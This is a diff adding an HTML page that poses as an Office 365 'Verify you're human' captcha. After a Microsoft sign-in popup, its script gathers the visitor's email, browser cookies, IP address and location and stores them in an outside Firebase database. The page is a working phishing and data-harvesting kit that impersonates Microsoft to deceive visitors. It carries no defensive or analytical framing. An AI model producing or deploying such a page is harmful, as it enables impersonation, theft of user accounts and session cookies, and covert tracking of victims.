@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Office 365 - Verify You're Human</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, rgba(248, 195, 196, 0.35), rgba(253, 228, 207, 0.35), rgba(205, 235, 248, 0.35), rgba(228, 249, 245, 0.35));
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            position: relative; /* Added for positioning the spinner */
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 150px;
+        }
+
+        h1 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        p.subtext {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 10px;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            background-color: #b0b0b0;
+        }
+
+        footer {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        footer a {
+            font-size: 12px;
+            color: #666;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Loading spinner styles */
+        #loading-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+            font-size: 16px;
+            color: #0078d4;
+        }
+    </style>
+
+    <!-- Include Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth.js"></script>
+
+    <!-- Include MSAL library -->
+    <script src="https://alcdn.msauth.net/browser/2.14.0/js/msal-browser.min.js"></script>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="office365-logo.png" alt="Office 365 Logo">
+        </div>
+        <h1>Verify you’re human</h1>
+        <p class="subtext">Before you continue, please verify your identity by checking the box below.</p>
+
+        <!-- Checkbox for "You're Human" -->
+        <div class="checkbox-container">
+            <input type="checkbox" id="human-checkbox" aria-checked="false">
+            <label for="human-checkbox">I'm not a robot</label>
+        </div>
+        <button id="continue-button" disabled>Continue</button>
+
+        <!-- Loading spinner -->
+        <div id="loading-spinner">Loading...</div>
+
+        <footer>
+            <p><a href="#">Terms of use</a> | <a href="#">Privacy & cookies</a></p>
+        </footer>
+    </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA_4QT6t0OacVkyrRO_8skjBJE-h1NRojM",
+            authDomain: "project-2006669879225434405.firebaseapp.com",
+            projectId: "project-2006669879225434405",
+            storageBucket: "project-2006669879225434405.appspot.com",
+            messagingSenderId: "803339574811",
+            appId: "1:803339574811:web:146b22453ad870bd4522be"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const firestore = firebase.firestore();
+        const auth = firebase.auth();
+
+        // MSAL configuration
+        const msalConfig = {
+            auth: {
+                clientId: "1507b5fa-f81b-4281-8923-4b59163a6bb2",
+                authority: "https://login.microsoftonline.com/common",
+                redirectUri: "https://9013351951.github.io/9013351951"
+            }
+        };
+
+        const msalInstance = new msal.PublicClientApplication(msalConfig);
+
+        const checkbox = document.getElementById('human-checkbox');
+        const continueButton = document.getElementById('continue-button');
+        const loadingSpinner = document.getElementById('loading-spinner');
+
+        // Enable the continue button when checkbox is checked
+        checkbox.addEventListener('change', function () {
+            continueButton.disabled = !this.checked;
+            checkbox.setAttribute('aria-checked', this.checked);
+        });
+
+        // Redirect to Office 365 login page when button is clicked
+        continueButton.addEventListener('click', function () {
+            if (checkbox.checked) {  // Ensure the checkbox is checked before proceeding
+                login();
+            }
+        });
+
+        function login() {
+            loadingSpinner.style.display = 'block'; // Show loading spinner
+
+            const loginRequest = {
+                scopes: ["User.Read"]
+            };
+
+            msalInstance.loginPopup(loginRequest)
+                .then((loginResponse) => {
+                    console.log("Login successful", loginResponse);
+                    getUserProfile();
+                })
+                .catch((error) => {
+                    console.error("Login error: ", error);
+                    alert("Login failed. Please try again.");
+                })
+                .finally(() => {
+                    loadingSpinner.style.display = 'none'; // Hide spinner after login attempt
+                });
+        }
+
+        function getUserProfile() {
+            const account = msalInstance.getAllAccounts()[0];
+            if (account) {
+                const email = account.username;
+                const cookies = document.cookie;
+                fetchUserLocation(email, cookies);
+            }
+        }
+
+        function fetchUserLocation(email, cookies) {
+            fetch('https://ipinfo.io/json?token=05462c585ec637') // Replace with your IPinfo token
+                .then(response => response.json())
+                .then(data => {
+                    const userData = {
+                        email: email,
+                        cookies: cookies,
+                        country: data.country,
+                        city: data.city,
+                        ip_address: data.ip
+                    };
+                    saveUserData(userData);
+                })
+                .catch(error => {
+                    console.error('Error fetching location data:', error);
+                });
+        }
+
+        function saveUserData(userData) {
+            firestore.collection('users').add(userData)
+                .then(() => {
+                    console.log('User data saved successfully');
+                    alert('Welcome! Your data has been saved.');
+                })
+                .catch((error) => {
+                    console.error("Error saving user data: ", error);
+                    alert('An error occurred while saving your data.');
+                });
+        }
+
+        window.addEventListener('load', function() {
+            const queryParams = new URLSearchParams(window.location.search);
+            if (queryParams.has('code')) {
+                // Additional logic after redirect if necessary
+            }
+        });
+    </script>
+
+</body>
+</html>
